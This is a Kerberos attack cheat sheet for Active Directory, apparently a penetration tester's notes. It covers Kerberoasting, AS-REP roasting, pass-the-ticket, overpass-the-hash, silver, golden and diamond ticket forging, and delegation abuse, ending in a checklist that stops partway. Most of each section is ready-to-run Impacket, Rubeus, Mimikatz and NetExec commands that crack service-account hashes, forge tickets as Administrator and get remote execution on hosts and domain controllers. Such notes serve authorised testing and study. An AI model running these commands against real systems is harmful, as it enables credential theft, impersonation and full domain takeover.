# Kerberos Attacks

Kerberos attacks focus on abusing tickets, service principals, delegation, encryption keys, and trust relationships inside Active Directory.

This section assumes basic AD and Kerberos concepts are already known: users, computers, SPNs, KDC, TGT, TGS, PAC, realms, service tickets, and authentication flows.

Useful resources:

- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [The Hacker Recipes - Kerberos](https://www.thehacker.recipes/ad/movement/kerberos/)
- [The Hacker Recipes - Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
- [The Hacker Recipes - ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)
- [The Hacker Recipes - Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations/)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Impacket](https://github.com/fortra/impacket)
- [WADComs](https://wadcoms.github.io/)

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export REALM=CORP.LOCAL
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export TARGET=filesrv01.corp.local
export TARGET_IP=10.10.10.20
export NTLM='8846f7eaee8fb117ad06bdd830b7586c'
export AES256='0000000000000000000000000000000000000000000000000000000000000000'
export DOMAIN_SID='S-1-5-21-1111111111-2222222222-3333333333'
```

---

## Kerberoasting

Kerberoasting targets accounts with Service Principal Names.

A domain user can request a Kerberos service ticket for an SPN. If the SPN belongs to a user account, the returned ticket contains material encrypted with a key derived from that service account's password. The ticket can then be cracked offline.

Requirements:

| Requirement | Notes |
| --- | --- |
| Valid domain user | Usually any low-privileged domain account. |
| SPN target | User account with one or more SPNs. |
| KDC access | Port `88` to domain controller. |
| Cracking setup | Hashcat or John with wordlists/rules. |

Good Kerberoast targets often have:

- `servicePrincipalName` on a user account
- old `pwdLastSet`
- privileged group membership
- service-like account name
- weak or predictable password pattern
- MSSQL, HTTP, custom application, or legacy service SPNs

Find SPN users with LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
sAMAccountName servicePrincipalName memberOf pwdLastSet lastLogonTimestamp
```

PowerView:

```powershell
Get-DomainUser -SPN
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,pwdlastset,memberof
```

Impacket:

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request
```

Save hashes:

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
```

With NT hash:

```bash
GetUserSPNs.py $DOMAIN/$USER -hashes :$NTLM -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
```

Kerberos auth with ccache:

```bash
export KRB5CCNAME=$PWD/$USER.ccache
GetUserSPNs.py $DOMAIN/$USER -k -no-pass -dc-host $DC_HOST -request -outputfile kerberoast_hashes.txt
```

NetExec:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --kerberoasting kerberoast_hashes.txt
```

Rubeus:

```powershell
Rubeus.exe kerberoast
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt
Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /outfile:mssql_tgs.txt
```

Crack with Hashcat:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
hashcat -m 13100 kerberoast_hashes.txt --show
```

Common Hashcat modes:

| Hash type | Mode |
| --- | --- |
| Kerberos 5 TGS-REP etype 23 | `13100` |
| Kerberos 5 TGS-REP etype 17 | `19600` |
| Kerberos 5 TGS-REP etype 18 | `19700` |

Crack with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
john --show kerberoast_hashes.txt
```


---

## ASREP Roasting

ASREP roasting targets users that do not require Kerberos pre-authentication.

If pre-authentication is disabled, the KDC can return AS-REP material encrypted with the user's password-derived key. This material can be cracked offline.

Requirements:

| Requirement | Notes |
| --- | --- |
| Domain name | Example: `corp.local`. |
| DC IP | KDC target. |
| Username list | Required for unauthenticated check. |
| Kerberos reachable | Port `88`. |
| DONT_REQ_PREAUTH | Target account flag. |

Unauthenticated check with Impacket:

```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass
```

Save hashes:

```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -outputfile asrep_hashes.txt
```

Authenticated ASREP roasting:

```bash
GetNPUsers.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile asrep_hashes.txt
```

With hash:

```bash
GetNPUsers.py $DOMAIN/$USER -hashes :$NTLM -dc-ip $DC_IP -request -outputfile asrep_hashes.txt
```

NetExec:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --asreproast asrep_hashes.txt
```

LDAP discovery:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
sAMAccountName userPrincipalName memberOf pwdLastSet
```

PowerView:

```powershell
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

Rubeus:

```powershell
Rubeus.exe asreproast
Rubeus.exe asreproast /user:alice
Rubeus.exe asreproast /outfile:asrep_hashes.txt
Rubeus.exe asreproast /domain:corp.local /outfile:asrep_hashes.txt
```

Crack with Hashcat:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt --show
```

Crack with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
john --show asrep_hashes.txt
```


---

## Pass the Ticket

Pass the Ticket uses a Kerberos ticket directly instead of a plaintext password or NT hash.

Common ticket formats:

| Format | Platform / tool |
| --- | --- |
| `.kirbi` | Windows Kerberos ticket format. |
| `.ccache` | MIT Kerberos cache format, commonly used on Linux. |

Common ticket types:

| Ticket | Meaning |
| --- | --- |
| TGT | Ticket Granting Ticket. |
| TGS | Service ticket for a specific SPN. |

List Linux tickets:

```bash
klist
```

Use ccache:

```bash
export KRB5CCNAME=$PWD/alice.ccache
klist
```

Use Kerberos with Impacket:

```bash
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET
smbexec.py -k -no-pass $DOMAIN/$USER@$TARGET
atexec.py -k -no-pass $DOMAIN/$USER@$TARGET "whoami"
```

Use Kerberos with NetExec:

```bash
nxc smb $TARGET -k --use-kcache
nxc ldap $DC_HOST -k --use-kcache
nxc winrm $TARGET -k --use-kcache
```

Request a TGT with known password:

```bash
getTGT.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
klist
```

Request a TGT with NT hash:

```bash
getTGT.py $DOMAIN/$USER -hashes :$NTLM -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
```

Request a TGT with AES key:

```bash
getTGT.py $DOMAIN/$USER -aesKey $AES256 -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
```

Request a service ticket:

```bash
getST.py -spn cifs/$TARGET $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
```

Use a ccache ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
smbclient.py -k -no-pass $DOMAIN/Administrator@$TARGET
```

Convert tickets:

```bash
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
```

Windows list tickets:

```cmd
klist
```

Rubeus triage:

```powershell
Rubeus.exe triage
Rubeus.exe klist
```

Rubeus Pass the Ticket:

```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
klist
```

Base64 ticket:

```powershell
Rubeus.exe ptt /ticket:BASE64_TICKET
```

Mimikatz:

```cmd
mimikatz.exe
kerberos::list
kerberos::ptt ticket.kirbi
```

Purge tickets:

```cmd
klist purge
```

Rubeus purge:

```powershell
Rubeus.exe purge
```



---

## Overpass the Hash

Overpass the Hash uses an NT hash or AES key to obtain a Kerberos TGT.

It is different from Pass the Hash. Pass the Hash uses NTLM authentication directly. Overpass the Hash uses the hash or key to ask Kerberos for a TGT, then uses Kerberos tickets.

Requirements:

| Requirement | Notes |
| --- | --- |
| NT hash or AES key | Account key material. |
| Domain name | Kerberos realm context. |
| DC IP or hostname | KDC target. |
| Kerberos reachable | Port `88`. |

Linux with Impacket NT hash:

```bash
getTGT.py $DOMAIN/$USER -hashes :$NTLM -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
klist
```

Linux with AES key:

```bash
getTGT.py $DOMAIN/$USER -aesKey $AES256 -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
klist
```

Use the ticket:

```bash
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET
smbexec.py -k -no-pass $DOMAIN/$USER@$TARGET
nxc smb $TARGET -k --use-kcache
```

Windows with Rubeus RC4/NT hash:

```powershell
Rubeus.exe asktgt /user:alice /domain:corp.local /rc4:8846f7eaee8fb117ad06bdd830b7586c /dc:dc01.corp.local /ptt
```

Windows with AES256:

```powershell
Rubeus.exe asktgt /user:alice /domain:corp.local /aes256:0000000000000000000000000000000000000000000000000000000000000000 /dc:dc01.corp.local /ptt
```

Save ticket instead of injecting:

```powershell
Rubeus.exe asktgt /user:alice /domain:corp.local /rc4:8846f7eaee8fb117ad06bdd830b7586c /dc:dc01.corp.local /outfile:alice_tgt.kirbi
```

Mimikatz:

```cmd
mimikatz.exe
sekurlsa::pth /user:alice /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
```

Then from the spawned process:

```cmd
klist
dir \\target.corp.local\c$
```


---

## Silver Ticket

A Silver Ticket is a forged Kerberos service ticket.

It is forged for a specific service SPN and encrypted with the target service account key. This means it is usually scoped to one service on one host or service account.

Requirements:

| Requirement | Notes |
| --- | --- |
| Service account hash/key | Key for the account owning the SPN. |
| Domain SID | Needed for PAC fields. |
| Domain name | Kerberos realm context. |
| Target SPN | Example: `cifs/filesrv01.corp.local`. |
| Username/RID/group IDs | PAC identity fields. |

Common SPNs:

| SPN | Service |
| --- | --- |
| `cifs/host` | SMB file/admin shares. |
| `host/host` | Generic host services. |
| `http/host` | Web service. |
| `mssqlsvc/host:1433` | MSSQL. |
| `ldap/dc` | LDAP. |
| `wsman/host` | WinRM. |

Linux with Impacket `ticketer.py`:

```bash
ticketer.py -nthash $NTLM -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$TARGET Administrator
```

Use created ccache:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
smbclient.py -k -no-pass $DOMAIN/Administrator@$TARGET
```

For MSSQL:

```bash
ticketer.py -nthash $NTLM -domain-sid $DOMAIN_SID -domain $DOMAIN -spn MSSQLSvc/sql01.corp.local:1433 Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
mssqlclient.py -k -no-pass $DOMAIN/Administrator@sql01.corp.local
```

Windows with Rubeus:

```powershell
Rubeus.exe silver /rc4:8846f7eaee8fb117ad06bdd830b7586c /user:Administrator /service:cifs/filesrv01.corp.local /ldap /ptt
```

Explicit values:

```powershell
Rubeus.exe silver /rc4:8846f7eaee8fb117ad06bdd830b7586c /user:Administrator /service:cifs/filesrv01.corp.local /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /id:500 /groups:512 /ptt
```

Mimikatz:

```cmd
mimikatz.exe
kerberos::golden /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /target:filesrv01.corp.local /service:cifs /rc4:8846f7eaee8fb117ad06bdd830b7586c /user:Administrator /ptt
```

Validate:

```cmd
klist
dir \\filesrv01.corp.local\c$
```

Linux validate:

```bash
smbclient.py -k -no-pass $DOMAIN/Administrator@$TARGET
```


---

## Golden Ticket

A Golden Ticket is a forged Kerberos TGT.

It is created using the `krbtgt` account key. Because the TGT is trusted by the domain, this is a domain-compromise-level technique.

Requirements:

| Requirement | Notes |
| --- | --- |
| krbtgt hash/key | NT hash or AES key of krbtgt account. |
| Domain SID | Required for forged PAC. |
| Domain name | Kerberos realm. |
| Target username | Can be existing or forged identity. |
| Group RIDs | Commonly includes `512` for Domain Admins. |

Common group RIDs:

| RID | Group |
| --- | --- |
| `512` | Domain Admins |
| `513` | Domain Users |
| `518` | Schema Admins |
| `519` | Enterprise Admins |
| `520` | Group Policy Creator Owners |

Linux with Impacket:

```bash
ticketer.py -nthash KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
```

With groups:

```bash
ticketer.py -nthash KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -groups 512,513,518,519,520 Administrator
```

With AES:

```bash
ticketer.py -aesKey KRBTGT_AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
```

Use ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
wmiexec.py -k -no-pass $DOMAIN/Administrator@$TARGET
psexec.py -k -no-pass $DOMAIN/Administrator@$TARGET
```

Windows with Rubeus and LDAP-assisted PAC fields:

```powershell
Rubeus.exe golden /aes256:KRBTGT_AES256_KEY /ldap /user:Administrator /ptt
```

Explicit Rubeus:

```powershell
Rubeus.exe golden /rc4:KRBTGT_NT_HASH /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /id:500 /groups:512,513,518,519,520 /ptt
```

Mimikatz:

```cmd
mimikatz.exe
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:KRBTGT_NT_HASH /id:500 /groups:512,513,518,519,520 /ptt
```

Export instead of injecting:

```cmd
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:KRBTGT_NT_HASH /id:500 /groups:512 /ticket:golden.kirbi
```

Validate:

```cmd
klist
dir \\dc01.corp.local\c$
```

Linux:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
psexec.py -k -no-pass $DOMAIN/Administrator@$DC_HOST
```


---

## Diamond Ticket

A Diamond Ticket modifies a real TGT instead of creating a completely synthetic TGT from scratch.

The general idea is:

```text
Obtain a legitimate TGT
Decrypt or modify PAC using krbtgt key
Re-sign and re-encrypt the ticket
Use the resulting modified TGT
```

It requires high-value key material such as the `krbtgt` key, but starts from a real TGT request.

Requirements:

| Requirement | Notes |
| --- | --- |
| Valid way to obtain TGT | Password, hash, AES key, certificate, or tgtdeleg trick. |
| krbtgt key | Used to decrypt/sign/re-encrypt modified TGT. |
| Domain context | Domain, DC, SID, target user fields. |
| Rubeus | Common Windows tool for this technique. |

Rubeus with username and password:

```powershell
Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:alice /password:Password123! /enctype:aes /domain:corp.local /dc:dc01.corp.local /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

Rubeus with RC4 user key:

```powershell
Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:alice /rc4:USER_NT_HASH /domain:corp.local /dc:dc01.corp.local /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

Rubeus with AES user key:

```powershell
Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:alice /aes256:USER_AES256_KEY /domain:corp.local /dc:dc01.corp.local /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

Using tgtdeleg trick:

```powershell
Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

Save ticket:

```powershell
Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:alice /password:Password123! /enctype:aes /domain:corp.local /dc:dc01.corp.local /ticketuser:Administrator /ticketuserid:500 /groups:512 /outfile:diamond.kirbi
```

Validate:

```cmd
klist
dir \\dc01.corp.local\c$
```

---

## S4U2Self S4U2Proxy

S4U is a Kerberos extension used in delegation scenarios.

S4U2Self allows a service to obtain a service ticket to itself on behalf of a user.

S4U2Proxy allows that service to use the S4U2Self ticket to obtain a service ticket to another service, if delegation is allowed.

Common use in attacks:

```text
Controlled service account
  -> S4U2Self to impersonate target user to self
  -> S4U2Proxy to target service
  -> service ticket for target SPN
  -> Pass the Ticket
```

Requirements depend on the delegation type:

| Requirement | Notes |
| --- | --- |
| Controlled service account | User or computer account. |
| SPN | Usually required for classic constrained delegation. |
| Delegation rights | `msDS-AllowedToDelegateTo` or RBCD. |
| Target SPN | Example: `cifs/server.corp.local`. |
| Impersonated user | User to impersonate. |

Impacket constrained delegation:

```bash
getST.py -spn cifs/$TARGET -impersonate Administrator $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
```

With hash:

```bash
getST.py -spn cifs/$TARGET -impersonate Administrator $DOMAIN/$USER -hashes :$NTLM -dc-ip $DC_IP
```

With AES:

```bash
getST.py -spn cifs/$TARGET -impersonate Administrator $DOMAIN/$USER -aesKey $AES256 -dc-ip $DC_IP
```

Use output ccache:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
smbclient.py -k -no-pass $DOMAIN/Administrator@$TARGET
```

Rubeus S4U with account key:

```powershell
Rubeus.exe s4u /user:svc_web /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local /impersonateuser:Administrator /msdsspn:cifs/filesrv01.corp.local /dc:dc01.corp.local /ptt
```

Rubeus S4U with AES:

```powershell
Rubeus.exe s4u /user:svc_web /aes256:USER_AES256_KEY /domain:corp.local /impersonateuser:Administrator /msdsspn:cifs/filesrv01.corp.local /dc:dc01.corp.local /ptt
```

Use an existing TGT:

```powershell
Rubeus.exe s4u /ticket:svc_web.kirbi /impersonateuser:Administrator /msdsspn:cifs/filesrv01.corp.local /dc:dc01.corp.local /ptt
```

Alternative service name:

```powershell
Rubeus.exe s4u /user:svc_web /rc4:USER_NT_HASH /domain:corp.local /impersonateuser:Administrator /msdsspn:ldap/dc01.corp.local /altservice:cifs /dc:dc01.corp.local /ptt
```


---

## Kerberos Delegation

Kerberos delegation allows a service to access another service on behalf of a user.

Delegation is common in multi-tier applications.

Examples:

```text
User -> Web App -> SQL Server
User -> Frontend -> Backend API
User -> IIS App -> File Share
```

Delegation types:

| Type | Main idea |
| --- | --- |
| Unconstrained delegation | Service can receive forwarded TGTs. |
| Constrained delegation | Service can delegate only to configured SPNs. |
| Resource-Based Constrained Delegation | Target resource decides who can act on its behalf. |

Important attributes and flags:

| Attribute / flag | Meaning |
| --- | --- |
| `TRUSTED_FOR_DELEGATION` | Unconstrained delegation. |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | Protocol transition for constrained delegation. |
| `msDS-AllowedToDelegateTo` | Allowed target SPNs. |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD target-side security descriptor. |
| `AccountNotDelegated` | User is sensitive and cannot be delegated. |
| Protected Users group | Delegation may fail for members. |

NetExec delegation discovery:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --find-delegation
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --trusted-for-delegation
```

LDAP unconstrained delegation:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
sAMAccountName dNSHostName servicePrincipalName userAccountControl
```

LDAP constrained delegation:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(msDS-AllowedToDelegateTo=*)" \
sAMAccountName dNSHostName servicePrincipalName msDS-AllowedToDelegateTo userAccountControl
```

LDAP RBCD:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
sAMAccountName dNSHostName msDS-AllowedToActOnBehalfOfOtherIdentity
```

PowerView:

```powershell
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth
Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
```

Delegation result interpretation:

| Finding | Meaning |
| --- | --- |
| User with unconstrained delegation | High-value if controlled or reachable. |
| Computer with unconstrained delegation | High-value host. |
| `msDS-AllowedToDelegateTo` set | Constrained delegation candidate. |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | Protocol transition possible. |
| RBCD attribute set | Target allows specific principal to act on behalf of users. |
| Sensitive user | Delegation may not work against that user. |


---

## Unconstrained Delegation

Unconstrained delegation allows a service to receive forwarded TGTs from users authenticating to it.

If a host or service account with unconstrained delegation is compromised, tickets from users connecting to that service may be captured and reused.

Requirements:

| Requirement | Notes |
| --- | --- |
| Unconstrained delegation target | User or computer with delegation flag. |
| Control over target | Local admin or account control. |
| User authentication to target | A user must connect and present delegated ticket. |
| Ticket extraction tool | Rubeus, Mimikatz, or similar in lab. |

Find unconstrained delegation:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --trusted-for-delegation
```

LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
sAMAccountName dNSHostName servicePrincipalName userAccountControl
```

PowerView:

```powershell
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained
```

On controlled host, monitor tickets with Rubeus:

```powershell
Rubeus.exe monitor /interval:5
```

Monitor and target service:

```powershell
Rubeus.exe monitor /interval:5 /targetuser:Administrator
```

Harvest tickets:

```powershell
Rubeus.exe harvest /interval:30
```

List tickets:

```powershell
Rubeus.exe triage
```

Dump tickets:

```powershell
Rubeus.exe dump
```

Inject captured ticket:

```powershell
Rubeus.exe ptt /ticket:captured.kirbi
```

Mimikatz ticket extraction:

```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets
kerberos::list /export
```

Use ticket on Linux:

```bash
ticketConverter.py captured.kirbi captured.ccache
export KRB5CCNAME=$PWD/captured.ccache
klist
wmiexec.py -k -no-pass $DOMAIN/Administrator@$TARGET
```

Coercion can sometimes be used in labs to make a privileged machine authenticate to the unconstrained delegation host, but coercion techniques belong to NTLM relay/coercion notes.

---

## Constrained Delegation

Constrained delegation restricts which services an account can delegate to.

The allowed services are stored in `msDS-AllowedToDelegateTo`.

If the account is controlled and protocol transition is allowed, S4U can be used to impersonate another user to the allowed service.

Requirements:

| Requirement | Notes |
| --- | --- |
| Controlled delegated account | User or computer account. |
| `msDS-AllowedToDelegateTo` | Target SPNs. |
| Account key or TGT | Password, hash, AES key, or ticket. |
| Impersonated user | Target user to impersonate. |
| Target SPN | Must match allowed delegation path. |

Find constrained delegation:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --find-delegation
```

LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(msDS-AllowedToDelegateTo=*)" \
sAMAccountName dNSHostName servicePrincipalName msDS-AllowedToDelegateTo userAccountControl
```

PowerView:

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Get-DomainObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)"
```

Impacket with password:

```bash
getST.py -spn cifs/filesrv01.corp.local -impersonate Administrator $DOMAIN/svc_web:"$PASS" -dc-ip $DC_IP
```

With hash:

```bash
getST.py -spn cifs/filesrv01.corp.local -impersonate Administrator $DOMAIN/svc_web -hashes :$NTLM -dc-ip $DC_IP
```

With AES:

```bash
getST.py -spn cifs/filesrv01.corp.local -impersonate Administrator $DOMAIN/svc_web -aesKey $AES256 -dc-ip $DC_IP
```

Use service ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
smbclient.py -k -no-pass $DOMAIN/Administrator@filesrv01.corp.local
```

Rubeus:

```powershell
Rubeus.exe s4u /user:svc_web /rc4:USER_NT_HASH /domain:corp.local /impersonateuser:Administrator /msdsspn:cifs/filesrv01.corp.local /dc:dc01.corp.local /ptt
```

With alternate service:

```powershell
Rubeus.exe s4u /user:svc_web /rc4:USER_NT_HASH /domain:corp.local /impersonateuser:Administrator /msdsspn:ldap/dc01.corp.local /altservice:cifs /dc:dc01.corp.local /ptt
```


---

## Resource Based Constrained Delegation

Resource-Based Constrained Delegation, or RBCD, is configured on the target resource.

Instead of the service account listing where it can delegate, the target computer has an attribute that defines which principals can act on its behalf.

The key attribute is:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Common RBCD idea:

```text
Controlled principal A
  -> is allowed to act on behalf of users to target computer B
  -> request S4U ticket as privileged user to service on B
  -> use service ticket with Pass-the-Ticket
```

Requirements:

| Requirement | Notes |
| --- | --- |
| Controlled account | User or computer account used for S4U. |
| RBCD write path | Ability to set or abuse target's RBCD attribute. |
| Target computer | Resource where access is wanted. |
| Machine account quota or created machine | Often used in labs if user can create computers. |
| S4U tooling | Impacket or Rubeus. |

Find existing RBCD:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
sAMAccountName dNSHostName msDS-AllowedToActOnBehalfOfOtherIdentity
```

PowerView:

```powershell
Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
```

Check MachineAccountQuota:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN -M maq
```

LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(objectClass=domainDNS)" ms-DS-MachineAccountQuota
```

Create machine account with Impacket:

```bash
addcomputer.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -computer-name 'ATTACKBOX$' -computer-pass 'MachinePass123!'
```

Set RBCD with `rbcd.py` when you have rights to modify the target computer object:

```bash
rbcd.py -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
```

Read RBCD:

```bash
rbcd.py -delegate-to 'TARGET$' -action read $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
```

Get service ticket:

```bash
getST.py -spn cifs/target.corp.local -impersonate Administrator $DOMAIN/'ATTACKBOX$':'MachinePass123!' -dc-ip $DC_IP
```

Use ccache:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
smbclient.py -k -no-pass $DOMAIN/Administrator@target.corp.local
```

Rubeus S4U with controlled computer hash:

```powershell
Rubeus.exe s4u /user:ATTACKBOX$ /rc4:MACHINE_NT_HASH /domain:corp.local /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /dc:dc01.corp.local /ptt
```

RBCD with PowerView-style object control usually involves setting `msDS-AllowedToActOnBehalfOfOtherIdentity` with a security descriptor. Exact commands vary by tooling and lab.


---

## Kerberos Checklist

- [ ] **Basic context**

```text
Domain:
Realm:
NetBIOS:
DC:
Domain SID:
Current user:
Current access:
Time synced:
```

Check time:

```bash
date
ntpdate -q $DC_IP
```

- [ ] **Kerberoasting**

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

Record:

```text
SPN users:
Hashes:
Cracked:
Service account access:
```

- [ ] **ASREP roasting**

```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Record:

```text
No-preauth users:
Hashes:
Cracked:
Validated access:
```

- [ ] **Pass the Ticket**

```bash
export KRB5CCNAME=$PWD/ticket.ccache
klist
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET
```

Windows:

```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
klist
```

Record:

```text
Ticket type:
Format:
User:
Service:
Access:
```

- [ ] **Overpass the Hash**

```bash
getTGT.py $DOMAIN/$USER -hashes :$NTLM -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
```

Windows:

```powershell
Rubeus.exe asktgt /user:alice /domain:corp.local /rc4:NT_HASH /dc:dc01.corp.local /ptt
```

Record:

```text
Hash/key:
TGT:
Injected:
Validated:
```

- [ ] **Silver Ticket**

```bash
ticketer.py -nthash SERVICE_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$TARGET Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
```

Record:

```text
Service hash:
SPN:
Forged user:
Validated service:
```

- [ ] **Golden Ticket**

```bash
ticketer.py -nthash KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
```

Record:

```text
krbtgt key:
Domain SID:
Forged user:
Groups:
Validated access:
```

- [ ] **Diamond Ticket**

```powershell
Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

Record:

```text
Base TGT:
krbtgt key:
